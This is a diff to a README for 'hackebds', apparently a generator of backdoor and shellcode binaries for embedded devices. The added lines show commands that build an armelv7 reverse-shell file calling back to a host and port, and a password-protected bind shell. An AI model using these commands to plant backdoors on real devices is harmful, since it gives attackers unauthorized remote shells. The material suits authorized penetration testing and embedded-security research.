@@ -49,7 +49,16 @@ apt install binutils-arm-linux-gnueabi/hirsute
    ```
 
    ![image-20221102181217933](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102181217933.png)
-
+   ```
+   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file
+   ```
+   ![image-20221102181217933](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102181217933.png)
+   
+   ```
+   hackebds -reverse_ip 0.0.0.0 -reverse_port 8081 -arch armelv7 -res bind_shell -passwd 1231#
+   ```
+   ![image-20221102182939434](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102182939434.png)
+   
 2. Generate backdoor programs of various architectures, encapsulate pure shellcode, and successfully connect to the shell
 
 ```
